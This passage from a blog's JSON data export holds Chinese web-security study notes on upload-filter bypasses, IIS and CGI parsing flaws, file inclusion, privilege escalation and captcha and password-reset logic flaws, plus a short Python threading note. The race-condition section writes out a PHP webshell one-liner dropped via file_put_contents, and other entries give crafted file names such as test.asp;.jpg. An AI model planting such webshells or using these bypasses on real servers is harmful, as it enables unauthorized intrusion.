getimagesize图片类型绕过</h2><ul>\n<li>上传正常类型的图片查看是否能够正常上传</li>\n<li>换个图片类型进行图片马制作上传</li>\n</ul>\n<h2 id=\"0x14-php-exif模块图片类型绕过\"><a href=\"#0x14-php-exif模块图片类型绕过\" class=\"headerlink\" title=\"0x14 php_exif模块图片类型绕过\"></a>0x14 php_exif模块图片类型绕过</h2><ul>\n<li>上同</li>\n</ul>\n<h2 id=\"0x15-二次渲染绕过\"><a href=\"#0x15-二次渲染绕过\" class=\"headerlink\" title=\"0x15 二次渲染绕过\"></a>0x15 二次渲染绕过</h2><ul>\n<li>发现上传上去的图片和下载下来的图片不一样时，说明可能进行了二次渲染</li>\n<li>使用gif文件制作图片马，将图片用Hex打开，从第三行开始输入一句话木马</li>\n</ul>\n<h2 id=\"0x16-move-uploaded-file-截断\"><a href=\"#0x16-move-uploaded-file-截断\" class=\"headerlink\" title=\"0x16 move_uploaded_file()截断\"></a>0x16 move_uploaded_file()截断</h2><ul>\n<li><p>同00截断，只不过00截断截的是路径，而这个截的是图片名字</p>\n</li>\n<li><p>将图片名截断</p>\n</li>\n<li><ul>\n<li>1.phpa.jpg使用Hex将a的61改成00</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"0x17-条件竞争绕过\"><a href=\"#0x17-条件竞争绕过\" class=\"headerlink\" title=\"0x17 条件竞争绕过\"></a>0x17 条件竞争绕过</h2><ul>\n<li>先上传再检测才有用</li>\n<li>就算上传成功也会在一瞬间被删除，所以用到了<code>file_put_contents</code> 函数</li>\n<li>file_put_contents(‘1.php’,’<?php eval($REQUEST[8]); ?>‘)</li>\n<li>利用Brup跑包访问上传了图片马并加上上一条函数作为参数的网站，访问到的一瞬间会执行<code>file_put_contents</code> 函数在服务器中写入一句话木马文件1.php</li>\n</ul>\n<h2 id=\"0x18-IIS6-0解析漏洞\"><a href=\"#0x18-IIS6-0解析漏洞\" class=\"headerlink\" title=\"0x18 IIS6.0解析漏洞\"></a>0x18 IIS6.0解析漏洞</h2><h3 id=\"一\"><a href=\"#一\" class=\"headerlink\" title=\"一\"></a>一</h3><ul>\n<li>IIS6.0在应用程序扩展中默认设置了.asa .cer .cdx都会调用asp.dll</li>\n<li>利用asp一句话木马文件1.cer制作图片马</li>\n<li>利用Brup抓包修改文件后缀名为.cer上传</li>\n</ul>\n<h3 id=\"二\"><a href=\"#二\" class=\"headerlink\" title=\"二\"></a>二</h3><ul>\n<li><p>针对IIS6.0有效</p>\n</li>\n<li><p>IIS6.0在处理含有特殊符号的文件路径时会出现逻辑错误，造成文件解析漏洞，两种不同的利用方式都会被当作asp进行解析</p>\n</li>\n<li><ul>\n<li>test.asp;.jpg</li>\n<li>test.asp/123.jpg</li>\n</ul>\n</li>\n<li><p>上传文件时直接修改文件名后缀</p>\n</li>\n</ul>\n<h3 id=\"三\"><a href=\"#三\" class=\"headerlink\" title=\"三\"></a>三</h3><ul>\n<li>设置了上传存储的文件夹名为a.asp，所有上传到这个文件夹的文件都会被当做asp文件解析执行</li>\n</ul>\n<h2 id=\"0x19-CGI解析漏洞\"><a href=\"#0x19-CGI解析漏洞\" class=\"headerlink\" title=\"0x19 CGI解析漏洞\"></a>0x19 CGI解析漏洞</h2><ul>\n<li>仅用于PHP</li>\n<li>IIS7.5最多 Nginx IIS高版本都会有</li>\n<li>随便上传一张图片马，访问图片网址后加上/.php就会被执行一句话木马文件</li>\n</ul>\n"},{"title":"本地包含与远程包含","toc":false,"date":"2021-03-26T01:14:46.000Z","description":"本地包含与远程包含","_content":"\n## 0x01 定义\n\n相同代码重复出现会冗余，写一个文件，需要时调用\n\n文件包含，只要包含了，不管什么后缀，都会被当作PHP执行\n\n文件包含不是漏洞，只有被攻击者控制了才是漏洞\n\n* 本地文件包含(LFI)：控制自己服务器上的资源\n* 远程文件包含(RFI)：通过HTTP协议控制其他地方的资源\n  * 默认关闭，需要开启allow_url_include=on\n\n## 0x02 函数\n\n* include()\n* require()\n* include_once|require_once","source":"_posts/本地包含与远程包含.md","raw":"---\ntitle: 本地包含与远程包含\ntoc: false\ndate: 2021-03-26 09:14:46\ndescription: 本地包含与远程包含\ntags: Web安全\ncategories: Web安全\n---\n\n## 0x01 定义\n\n相同代码重复出现会冗余，写一个文件，需要时调用\n\n文件包含，只要包含了，不管什么后缀，都会被当作PHP执行\n\n文件包含不是漏洞，只有被攻击者控制了才是漏洞\n\n* 本地文件包含(LFI)：控制自己服务器上的资源\n* 远程文件包含(RFI)：通过HTTP协议控制其他地方的资源\n  * 默认关闭，需要开启allow_url_include=on\n\n## 0x02 函数\n\n* include()\n* require()\n* include_once|require_once","slug":"本地包含与远程包含","published":1,"updated":"2021-03-26T07:50:37.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckqmbe9ny001nicsw1nq3grnv","content":"<h2 id=\"0x01-定义\"><a href=\"#0x01-定义\" class=\"headerlink\" title=\"0x01 定义\"></a>0x01 定义</h2><p>相同代码重复出现会冗余，写一个文件，需要时调用</p>\n<p>文件包含，只要包含了，不管什么后缀，都会被当作PHP执行</p>\n<p>文件包含不是漏洞，只有被攻击者控制了才是漏洞</p>\n<ul>\n<li>本地文件包含(LFI)：控制自己服务器上的资源</li>\n<li>远程文件包含(RFI)：通过HTTP协议控制其他地方的资源<ul>\n<li>默认关闭，需要开启allow_url_include=on</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"0x02-函数\"><a href=\"#0x02-函数\" class=\"headerlink\" title=\"0x02 函数\"></a>0x02 函数</h2><ul>\n<li>include()</li>\n<li>require()</li>\n<li>include_once|require_once</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"0x01-定义\"><a href=\"#0x01-定义\" class=\"headerlink\" title=\"0x01 定义\"></a>0x01 定义</h2><p>相同代码重复出现会冗余，写一个文件，需要时调用</p>\n<p>文件包含，只要包含了，不管什么后缀，都会被当作PHP执行</p>\n<p>文件包含不是漏洞，只有被攻击者控制了才是漏洞</p>\n<ul>\n<li>本地文件包含(LFI)：控制自己服务器上的资源</li>\n<li>远程文件包含(RFI)：通过HTTP协议控制其他地方的资源<ul>\n<li>默认关闭，需要开启allow_url_include=on</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"0x02-函数\"><a href=\"#0x02-函数\" class=\"headerlink\" title=\"0x02 函数\"></a>0x02 函数</h2><ul>\n<li>include()</li>\n<li>require()</li>\n<li>include_once|require_once</li>\n</ul>\n"},{"title":"纲要","toc":false,"date":"2021-03-24T07:52:04.000Z","description":"学习方向","_content":"\n## 知识面，决定看到的攻击面有多广。\n\n## 知识链，决定发动的杀伤链有多深。\n\n\n\n## 从事任何方向的技术研究，不知道该干什么的时候，就问自己四个问题:\n\n- 这个方向上最新进展是什么？ 都知道吗？\n- 这个方向上最著名的专家有哪些？他们的研究都看过吗？\n- 这个方向上最著名的技术社区有哪些？精华帖都看过一遍吗？\n- 这个方向上最重要的文章、工具有哪些？文章都看过吗？工具都分析过吗？","source":"_posts/纲要.md","raw":"---\ntitle: 纲要\ntoc: false\ndate: 2021-03-24 15:52:04\ndescription: 学习方向\ntags: Web安全\ncategories: Web安全\n---\n\n## 知识面，决定看到的攻击面有多广。\n\n## 知识链，决定发动的杀伤链有多深。\n\n\n\n## 从事任何方向的技术研究，不知道该干什么的时候，就问自己四个问题:\n\n- 这个方向上最新进展是什么？ 都知道吗？\n- 这个方向上最著名的专家有哪些？他们的研究都看过吗？\n- 这个方向上最著名的技术社区有哪些？精华帖都看过一遍吗？\n- 这个方向上最重要的文章、工具有哪些？文章都看过吗？工具都分析过吗？","slug":"纲要","published":1,"updated":"2021-03-24T07:52:52.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckqmbe9nz001qicsw2wgag1xs","content":"<h2 id=\"知识面，决定看到的攻击面有多广。\"><a href=\"#知识面，决定看到的攻击面有多广。\" class=\"headerlink\" title=\"知识面，决定看到的攻击面有多广。\"></a>知识面，决定看到的攻击面有多广。</h2><h2 id=\"知识链，决定发动的杀伤链有多深。\"><a href=\"#知识链，决定发动的杀伤链有多深。\" class=\"headerlink\" title=\"知识链，决定发动的杀伤链有多深。\"></a>知识链，决定发动的杀伤链有多深。</h2><h2 id=\"从事任何方向的技术研究，不知道该干什么的时候，就问自己四个问题\"><a href=\"#从事任何方向的技术研究，不知道该干什么的时候，就问自己四个问题\" class=\"headerlink\" title=\"从事任何方向的技术研究，不知道该干什么的时候，就问自己四个问题:\"></a>从事任何方向的技术研究，不知道该干什么的时候，就问自己四个问题:</h2><ul>\n<li>这个方向上最新进展是什么？ 都知道吗？</li>\n<li>这个方向上最著名的专家有哪些？他们的研究都看过吗？</li>\n<li>这个方向上最著名的技术社区有哪些？精华帖都看过一遍吗？</li>\n<li>这个方向上最重要的文章、工具有哪些？文章都看过吗？工具都分析过吗？</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"知识面，决定看到的攻击面有多广。\"><a href=\"#知识面，决定看到的攻击面有多广。\" class=\"headerlink\" title=\"知识面，决定看到的攻击面有多广。\"></a>知识面，决定看到的攻击面有多广。</h2><h2 id=\"知识链，决定发动的杀伤链有多深。\"><a href=\"#知识链，决定发动的杀伤链有多深。\" class=\"headerlink\" title=\"知识链，决定发动的杀伤链有多深。\"></a>知识链，决定发动的杀伤链有多深。</h2><h2 id=\"从事任何方向的技术研究，不知道该干什么的时候，就问自己四个问题\"><a href=\"#从事任何方向的技术研究，不知道该干什么的时候，就问自己四个问题\" class=\"headerlink\" title=\"从事任何方向的技术研究，不知道该干什么的时候，就问自己四个问题:\"></a>从事任何方向的技术研究，不知道该干什么的时候，就问自己四个问题:</h2><ul>\n<li>这个方向上最新进展是什么？ 都知道吗？</li>\n<li>这个方向上最著名的专家有哪些？他们的研究都看过吗？</li>\n<li>这个方向上最著名的技术社区有哪些？精华帖都看过一遍吗？</li>\n<li>这个方向上最重要的文章、工具有哪些？文章都看过吗？工具都分析过吗？</li>\n</ul>\n"},{"title":"越权","toc":false,"date":"2021-03-25T01:44:21.000Z","description":"平行越权、垂直越权","_content":"\n## 0x01 越权\n\n逻辑安全漏洞，绕过权限，可以看到、修改、操作其他权限的内容\n\n* 平行越权\n* 垂直越权\n  * 向上：低权限可以操作高权限\n  * 向下：高权限可以操作低权限\n* 交叉越权：既可以平行，又可以垂直\n\n## 0x02 越权思路\n\n### 越权存在地点\n\n* 网站\n* APP\n* ......\n\n### 抓取参数\n\n* GET传参\n* POST传参\n* Cookie传参\n\n","source":"_posts/越权.md","raw":"---\ntitle: 越权\ntoc: false\ndate: 2021-03-25 09:44:21\ndescription: 平行越权、垂直越权\ntags: Web安全\ncategories: Web安全\n---\n\n## 0x01 越权\n\n逻辑安全漏洞，绕过权限，可以看到、修改、操作其他权限的内容\n\n* 平行越权\n* 垂直越权\n  * 向上：低权限可以操作高权限\n  * 向下：高权限可以操作低权限\n* 交叉越权：既可以平行，又可以垂直\n\n## 0x02 越权思路\n\n### 越权存在地点\n\n* 网站\n* APP\n* ......\n\n### 抓取参数\n\n* GET传参\n* POST传参\n* Cookie传参\n\n","slug":"越权","published":1,"updated":"2021-03-25T03:01:55.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckqmbe9o0001ticsw669562h5","content":"<h2 id=\"0x01-越权\"><a href=\"#0x01-越权\" class=\"headerlink\" title=\"0x01 越权\"></a>0x01 越权</h2><p>逻辑安全漏洞，绕过权限，可以看到、修改、操作其他权限的内容</p>\n<ul>\n<li>平行越权</li>\n<li>垂直越权<ul>\n<li>向上：低权限可以操作高权限</li>\n<li>向下：高权限可以操作低权限</li>\n</ul>\n</li>\n<li>交叉越权：既可以平行，又可以垂直</li>\n</ul>\n<h2 id=\"0x02-越权思路\"><a href=\"#0x02-越权思路\" class=\"headerlink\" title=\"0x02 越权思路\"></a>0x02 越权思路</h2><h3 id=\"越权存在地点\"><a href=\"#越权存在地点\" class=\"headerlink\" title=\"越权存在地点\"></a>越权存在地点</h3><ul>\n<li>网站</li>\n<li>APP</li>\n<li>……</li>\n</ul>\n<h3 id=\"抓取参数\"><a href=\"#抓取参数\" class=\"headerlink\" title=\"抓取参数\"></a>抓取参数</h3><ul>\n<li>GET传参</li>\n<li>POST传参</li>\n<li>Cookie传参</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"0x01-越权\"><a href=\"#0x01-越权\" class=\"headerlink\" title=\"0x01 越权\"></a>0x01 越权</h2><p>逻辑安全漏洞，绕过权限，可以看到、修改、操作其他权限的内容</p>\n<ul>\n<li>平行越权</li>\n<li>垂直越权<ul>\n<li>向上：低权限可以操作高权限</li>\n<li>向下：高权限可以操作低权限</li>\n</ul>\n</li>\n<li>交叉越权：既可以平行，又可以垂直</li>\n</ul>\n<h2 id=\"0x02-越权思路\"><a href=\"#0x02-越权思路\" class=\"headerlink\" title=\"0x02 越权思路\"></a>0x02 越权思路</h2><h3 id=\"越权存在地点\"><a href=\"#越权存在地点\" class=\"headerlink\" title=\"越权存在地点\"></a>越权存在地点</h3><ul>\n<li>网站</li>\n<li>APP</li>\n<li>……</li>\n</ul>\n<h3 id=\"抓取参数\"><a href=\"#抓取参数\" class=\"headerlink\" title=\"抓取参数\"></a>抓取参数</h3><ul>\n<li>GET传参</li>\n<li>POST传参</li>\n<li>Cookie传参</li>\n</ul>\n"},{"title":"验证码绕过、密码找回漏洞","toc":false,"date":"2021-03-24T07:56:57.000Z","description":"验证码绕过、密码找回漏洞","_content":"\n## 0x01 验证码绕过\n\n### 两个流派\n\n1. 脚本流派（机器学习）\n2. 逻辑流派（寻找验证码的逻辑漏洞）\n\n### 前端验证验证码，没有后端验证\n\n直接抓包进行跑数据包\n\n### 验证码设置了但是没有校验\n\n乱输入验证码也能够登录\n\n### 验证码可重复使用\n\n虽然登录失败验证码会变，但是输入原先的验证码也判定正确\n\n### 验证码空值绕过\n\n抓包将验证码的参数删除，发现验证码失效了\n\n### 验证码干扰过低\n\n使用脚本识别\n\n### 验证码会在HTML页面输出\n\n### 验证码可控制\n\n验证码包含在URL里面\n\n### 验证码有规则\n\n比如是时间戳的后六位、rand函数进行随机数\n\n### 万能验证码\n\n验证码无论是什么，输入000000就能直接绕过\n\n### 验证码有时候会藏在Cookie里\n\n分析是否存在验证码的参数\n\n### 图片验证码\n\n类型太少，容易识别\n\n### 多次登录后出现验证码\n\n* 基于Session\n* 基于IP：XFF、UA\n* 基于用户：爆破用户名\n\n## 0x02 密码找回漏洞\n\n### 验证码发送后前端返回\n\n抓包后在返回包里有验证码\n\n### 验证码无次数限制可爆破\n\n### 验证码可控\n\n验证码写在URL参数里面\n\n### 直接修改密码页面\n\n跳过验证码页面\n\n### 越权漏洞\n\n自己验证码通过改包然后修改他们密码\n\n","source":"_posts/验证码绕过、密码找回漏洞.md","raw":"---\ntitle: 验证码绕过、密码找回漏洞\ntoc: false\ndate: 2021-03-24 15:56:57\ndescription: 验证码绕过、密码找回漏洞\ntags: Web安全\ncategories: Web安全\n---\n\n## 0x01 验证码绕过\n\n### 两个流派\n\n1. 脚本流派（机器学习）\n2. 逻辑流派（寻找验证码的逻辑漏洞）\n\n### 前端验证验证码，没有后端验证\n\n直接抓包进行跑数据包\n\n### 验证码设置了但是没有校验\n\n乱输入验证码也能够登录\n\n### 验证码可重复使用\n\n虽然登录失败验证码会变，但是输入原先的验证码也判定正确\n\n### 验证码空值绕过\n\n抓包将验证码的参数删除，发现验证码失效了\n\n### 验证码干扰过低\n\n使用脚本识别\n\n### 验证码会在HTML页面输出\n\n### 验证码可控制\n\n验证码包含在URL里面\n\n### 验证码有规则\n\n比如是时间戳的后六位、rand函数进行随机数\n\n### 万能验证码\n\n验证码无论是什么，输入000000就能直接绕过\n\n### 验证码有时候会藏在Cookie里\n\n分析是否存在验证码的参数\n\n### 图片验证码\n\n类型太少，容易识别\n\n### 多次登录后出现验证码\n\n* 基于Session\n* 基于IP：XFF、UA\n* 基于用户：爆破用户名\n\n## 0x02 密码找回漏洞\n\n### 验证码发送后前端返回\n\n抓包后在返回包里有验证码\n\n### 验证码无次数限制可爆破\n\n### 验证码可控\n\n验证码写在URL参数里面\n\n### 直接修改密码页面\n\n跳过验证码页面\n\n### 越权漏洞\n\n自己验证码通过改包然后修改他们密码\n\n","slug":"验证码绕过、密码找回漏洞","published":1,"updated":"2021-03-24T07:59:02.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckqmbe9o1001wicswb87x3t5q","content":"<h2 id=\"0x01-验证码绕过\"><a href=\"#0x01-验证码绕过\" class=\"headerlink\" title=\"0x01 验证码绕过\"></a>0x01 验证码绕过</h2><h3 id=\"两个流派\"><a href=\"#两个流派\" class=\"headerlink\" title=\"两个流派\"></a>两个流派</h3><ol>\n<li>脚本流派（机器学习）</li>\n<li>逻辑流派（寻找验证码的逻辑漏洞）</li>\n</ol>\n<h3 id=\"前端验证验证码，没有后端验证\"><a href=\"#前端验证验证码，没有后端验证\" class=\"headerlink\" title=\"前端验证验证码，没有后端验证\"></a>前端验证验证码，没有后端验证</h3><p>直接抓包进行跑数据包</p>\n<h3 id=\"验证码设置了但是没有校验\"><a href=\"#验证码设置了但是没有校验\" class=\"headerlink\" title=\"验证码设置了但是没有校验\"></a>验证码设置了但是没有校验</h3><p>乱输入验证码也能够登录</p>\n<h3 id=\"验证码可重复使用\"><a href=\"#验证码可重复使用\" class=\"headerlink\" title=\"验证码可重复使用\"></a>验证码可重复使用</h3><p>虽然登录失败验证码会变，但是输入原先的验证码也判定正确</p>\n<h3 id=\"验证码空值绕过\"><a href=\"#验证码空值绕过\" class=\"headerlink\" title=\"验证码空值绕过\"></a>验证码空值绕过</h3><p>抓包将验证码的参数删除，发现验证码失效了</p>\n<h3 id=\"验证码干扰过低\"><a href=\"#验证码干扰过低\" class=\"headerlink\" title=\"验证码干扰过低\"></a>验证码干扰过低</h3><p>使用脚本识别</p>\n<h3 id=\"验证码会在HTML页面输出\"><a href=\"#验证码会在HTML页面输出\" class=\"headerlink\" title=\"验证码会在HTML页面输出\"></a>验证码会在HTML页面输出</h3><h3 id=\"验证码可控制\"><a href=\"#验证码可控制\" class=\"headerlink\" title=\"验证码可控制\"></a>验证码可控制</h3><p>验证码包含在URL里面</p>\n<h3 id=\"验证码有规则\"><a href=\"#验证码有规则\" class=\"headerlink\" title=\"验证码有规则\"></a>验证码有规则</h3><p>比如是时间戳的后六位、rand函数进行随机数</p>\n<h3 id=\"万能验证码\"><a href=\"#万能验证码\" class=\"headerlink\" title=\"万能验证码\"></a>万能验证码</h3><p>验证码无论是什么，输入000000就能直接绕过</p>\n<h3 id=\"验证码有时候会藏在Cookie里\"><a href=\"#验证码有时候会藏在Cookie里\" class=\"headerlink\" title=\"验证码有时候会藏在Cookie里\"></a>验证码有时候会藏在Cookie里</h3><p>分析是否存在验证码的参数</p>\n<h3 id=\"图片验证码\"><a href=\"#图片验证码\" class=\"headerlink\" title=\"图片验证码\"></a>图片验证码</h3><p>类型太少，容易识别</p>\n<h3 id=\"多次登录后出现验证码\"><a href=\"#多次登录后出现验证码\" class=\"headerlink\" title=\"多次登录后出现验证码\"></a>多次登录后出现验证码</h3><ul>\n<li>基于Session</li>\n<li>基于IP：XFF、UA</li>\n<li>基于用户：爆破用户名</li>\n</ul>\n<h2 id=\"0x02-密码找回漏洞\"><a href=\"#0x02-密码找回漏洞\" class=\"headerlink\" title=\"0x02 密码找回漏洞\"></a>0x02 密码找回漏洞</h2><h3 id=\"验证码发送后前端返回\"><a href=\"#验证码发送后前端返回\" class=\"headerlink\" title=\"验证码发送后前端返回\"></a>验证码发送后前端返回</h3><p>抓包后在返回包里有验证码</p>\n<h3 id=\"验证码无次数限制可爆破\"><a href=\"#验证码无次数限制可爆破\" class=\"headerlink\" title=\"验证码无次数限制可爆破\"></a>验证码无次数限制可爆破</h3><h3 id=\"验证码可控\"><a href=\"#验证码可控\" class=\"headerlink\" title=\"验证码可控\"></a>验证码可控</h3><p>验证码写在URL参数里面</p>\n<h3 id=\"直接修改密码页面\"><a href=\"#直接修改密码页面\" class=\"headerlink\" title=\"直接修改密码页面\"></a>直接修改密码页面</h3><p>跳过验证码页面</p>\n<h3 id=\"越权漏洞\"><a href=\"#越权漏洞\" class=\"headerlink\" title=\"越权漏洞\"></a>越权漏洞</h3><p>自己验证码通过改包然后修改他们密码</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"0x01-验证码绕过\"><a href=\"#0x01-验证码绕过\" class=\"headerlink\" title=\"0x01 验证码绕过\"></a>0x01 验证码绕过</h2><h3 id=\"两个流派\"><a href=\"#两个流派\" class=\"headerlink\" title=\"两个流派\"></a>两个流派</h3><ol>\n<li>脚本流派（机器学习）</li>\n<li>逻辑流派（寻找验证码的逻辑漏洞）</li>\n</ol>\n<h3 id=\"前端验证验证码，没有后端验证\"><a href=\"#前端验证验证码，没有后端验证\" class=\"headerlink\" title=\"前端验证验证码，没有后端验证\"></a>前端验证验证码，没有后端验证</h3><p>直接抓包进行跑数据包</p>\n<h3 id=\"验证码设置了但是没有校验\"><a href=\"#验证码设置了但是没有校验\" class=\"headerlink\" title=\"验证码设置了但是没有校验\"></a>验证码设置了但是没有校验</h3><p>乱输入验证码也能够登录</p>\n<h3 id=\"验证码可重复使用\"><a href=\"#验证码可重复使用\" class=\"headerlink\" title=\"验证码可重复使用\"></a>验证码可重复使用</h3><p>虽然登录失败验证码会变，但是输入原先的验证码也判定正确</p>\n<h3 id=\"验证码空值绕过\"><a href=\"#验证码空值绕过\" class=\"headerlink\" title=\"验证码空值绕过\"></a>验证码空值绕过</h3><p>抓包将验证码的参数删除，发现验证码失效了</p>\n<h3 id=\"验证码干扰过低\"><a href=\"#验证码干扰过低\" class=\"headerlink\" title=\"验证码干扰过低\"></a>验证码干扰过低</h3><p>使用脚本识别</p>\n<h3 id=\"验证码会在HTML页面输出\"><a href=\"#验证码会在HTML页面输出\" class=\"headerlink\" title=\"验证码会在HTML页面输出\"></a>验证码会在HTML页面输出</h3><h3 id=\"验证码可控制\"><a href=\"#验证码可控制\" class=\"headerlink\" title=\"验证码可控制\"></a>验证码可控制</h3><p>验证码包含在URL里面</p>\n<h3 id=\"验证码有规则\"><a href=\"#验证码有规则\" class=\"headerlink\" title=\"验证码有规则\"></a>验证码有规则</h3><p>比如是时间戳的后六位、rand函数进行随机数</p>\n<h3 id=\"万能验证码\"><a href=\"#万能验证码\" class=\"headerlink\" title=\"万能验证码\"></a>万能验证码</h3><p>验证码无论是什么，输入000000就能直接绕过</p>\n<h3 id=\"验证码有时候会藏在Cookie里\"><a href=\"#验证码有时候会藏在Cookie里\" class=\"headerlink\" title=\"验证码有时候会藏在Cookie里\"></a>验证码有时候会藏在Cookie里</h3><p>分析是否存在验证码的参数</p>\n<h3 id=\"图片验证码\"><a href=\"#图片验证码\" class=\"headerlink\" title=\"图片验证码\"></a>图片验证码</h3><p>类型太少，容易识别</p>\n<h3 id=\"多次登录后出现验证码\"><a href=\"#多次登录后出现验证码\" class=\"headerlink\" title=\"多次登录后出现验证码\"></a>多次登录后出现验证码</h3><ul>\n<li>基于Session</li>\n<li>基于IP：XFF、UA</li>\n<li>基于用户：爆破用户名</li>\n</ul>\n<h2 id=\"0x02-密码找回漏洞\"><a href=\"#0x02-密码找回漏洞\" class=\"headerlink\" title=\"0x02 密码找回漏洞\"></a>0x02 密码找回漏洞</h2><h3 id=\"验证码发送后前端返回\"><a href=\"#验证码发送后前端返回\" class=\"headerlink\" title=\"验证码发送后前端返回\"></a>验证码发送后前端返回</h3><p>抓包后在返回包里有验证码</p>\n<h3 id=\"验证码无次数限制可爆破\"><a href=\"#验证码无次数限制可爆破\" class=\"headerlink\" title=\"验证码无次数限制可爆破\"></a>验证码无次数限制可爆破</h3><h3 id=\"验证码可控\"><a href=\"#验证码可控\" class=\"headerlink\" title=\"验证码可控\"></a>验证码可控</h3><p>验证码写在URL参数里面</p>\n<h3 id=\"直接修改密码页面\"><a href=\"#直接修改密码页面\" class=\"headerlink\" title=\"直接修改密码页面\"></a>直接修改密码页面</h3><p>跳过验证码页面</p>\n<h3 id=\"越权漏洞\"><a href=\"#越权漏洞\" class=\"headerlink\" title=\"越权漏洞\"></a>越权漏洞</h3><p>自己验证码通过改包然后修改他们密码</p>\n"},{"title":"进程与线程","toc":false,"description":"学习笔记","date":"2021-03-24T06:11:10.000Z","_content":"\n## 0x01 并发\n\n在一段时间内交替去执行多个任务\n\n## 0x02 并行\n\n在一段时间内真正的同时一起执行多个任务\n\n## 0x03 线程\n\n线程之间的执行顺序是无序的\n\n## 0x04 设置守护主进程\n\n子进程对象.daemon = True\n\n## 0x05 设置守护主线程\n\n1. threading.Thread(target=方法名, daemon=True)\n2. 子线程对象.setDaemon(True)","source":"_posts/进程与线程.md","raw":"---\ntitle: 进程与线程\ntoc: false\ndescription: 学习笔记\ndate: 2021-03-24 14:11:10\ntags: Python\ncategories: Python\n---\n\n## 0x01 并发\n\n在一段时间内交替去执行多个任务\n\n## 0x02 并行\n\n在一段时间内真正的同时一起执行多个任务\n\n## 0x03 线程\n\n线程之间的执行顺序是无序的\n\n## 0x04 设置守护主进程\n\n子进程对象.daemon = True\n\n## 0x05 设置守护主线程\n\n1. threading.Thread(target=方法名, daemon=True)\n2. 子线程对象.setDaemon(True)","slug":"进程与线程","published":1,"updated":"2021-03-24T06:19:30.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckqmbe9o3002dicswe3119vgs","content":"<h2 id=\"0x01-并发\"><a href=\"#0x01-并发\" class=\"headerlink\" title=\"0x01 并发\"></a>0x01 并发</h2><p>在一段时间内交替去执行多个任务</p>\n<h2 id=\"0x02-并行\"><a href=\"#0x02-并行\" class=\"headerlink\" title=\"0x02 并行\"></a>0x02 并行</h2><p>在一段时间内真正的同时一起执行多个任务</p>\n<h2 id=\"0x03-线程\"><a href=\"#0x03-线程\" class=\"headerlink\" title=\"0x03 线程\"></a>0x03 线程</h2><p>线程之间的执行顺序是无序的</p>\n<h2 id=\"0x04-设置守护主进程\"><a href=\"#0x04-设置守护主进程\" class=\"headerlink\" title=\"0x04 设置守护主进程\"></a>0x04 设置守护主进程</h2><p>子进程对象.daemon = True</p>\n<h2 id=\"0x05-设置守护主线程\"><a href=\"#0x05-设置守护主线程\" class=\"headerlink\" title=\"0x05 设置守护主线程\"></a>0x05 设置守护主线程</h2><ol>\n<li>threading.Thread(target=方法名, daemon=True)</li>\n<li>子线程对象.setDaemon(True)</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"0x01-并发\"><a href=\"#0x01-并发\" class=\"headerlink\" title=\"0x01 并发\"></a>0x01 并发</h2><p>在一段时间内交替去执行多个任务</p>\n<h2 id=\"0x02-并行\"><a href=\"#0x02-并行\" class=\"headerlink\" title=\"0x02 并行\"></a>0x02 并行</h2><p>在一段时间内真正的同时一起执行多个任务</p>\n<h2 id=\"0x03-线程\"><a href=\"#0x03-线程\" class=\"headerlink\" title=\"0x03 线程\"></a>0x03 线程</h2><p>线程之间的执行顺序是无序的</p>\n<h2 id=\"0x04-设置守护主进程\"><a href=\"#0x04-设置守护主进程\" class=\"headerlink\" title=\"0x04 设置守护主进程\"></a>0x04 设置守护主进程</h2><p>子进程对象.daemon = True</p>\n<h2 id=\"0x05-设置守护主线程\"><a href=\"#0x05-设置守护主线程\" class=\"headerlink\" title=\"0x05 设置守护主线程\"></a>0x05 设置守护主线程</h2><ol>\n<li>threading.Thread(target=方法名, daemon=True)</li>\n<li>子线程对象.setDaemon(True)</li>\n</ol>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"ckqmbe9nd0001icsw7qhr5oth","category_id":"ckqmbe9ng0003icsw6jrwgj7b","_id":"ckqmbe9nl000dicsw6d9t7lgm"},{"post_id":"ckqmbe9nh0005icsw8jo6ggms","category_id":"ckqmbe9nj0008icsw4b8hge02","_id":"ckqmbe9nn000jicswa10oh69z"},{"post_id":"ckqmbe9ni0006icswfbn9fs8k","category_id":"ckqmbe9nl000eicsw9rwxc256","_id":"ckqmbe9nq000ricsw708g5pt6"},{"post_id":"ckqmbe9nm000iicswbwpj25zs","category_id":"ckqmbe9nj0008icsw4b8hge02","_id":"ckqmbe9nr000vicsw35vqcm9s"},{"post_id":"ckqmbe9nj0007icsw5o7r86c2","category_id":"ckqmbe9nl000eicsw9rwxc256","_id":"ckqmbe9ns000zicsw18dkah3b"},{"post_id":"ckqmbe9np000oicsw24oy60rt","category_id":"ckqmbe9nj0008icsw4b8hge02","_id":"ckqmbe9nu0013icswddyt65l7"},{"post_id":"ckqmbe9nr000ticswfwibf038","category_id":"ckqmbe9nj0008icsw4b8hge02","_id":"ckqmbe9nu0017icswgogz7hol"},{"post_id":"ckqmbe9nk000bicswc9mph37b","category_id":"ckqmbe9nl000eicsw9rwxc256","_id":"ckqmbe9nv001bicswezp32qco"},{"post_id":"ckqmbe9ns000wicsw8ojhcsrb","category_id":"ckqmbe9nj0008icsw4b8hge02","_id":"ckqmbe9nw001eicswarsk9c4l"},{"post_id":"ckqmbe9nt0011icsw3km35bv3","category_id":"ckqmbe9nj0008icsw4b8hge02","_id":"ckqmbe9nx001jicsw4dh8a4mh"},{"post_id":"ckqmbe9nl000cicsw9sdjabjt","category_id":"ckqmbe9nl000eicsw9rwxc256","_id":"ckqmbe9ny001micsw4v502nx1"},{"post_id":"ckqmbe9nu0014icsw3nkg1ucw","category_id":"ckqmbe9nj0008icsw4b8hge02","_id":"ckqmbe9nz001picsw4vbp146a"},{"post_id":"ckqmbe9nv0019icswdm1y6u05","category_id":"ckqmbe9nj0008icsw4b8hge02","_id":"ckqmbe9o0001sicsw5i5bhzuk"},{"post_id":"ckqmbe9nm000gicswahfvfjuc","category_id":"ckqmb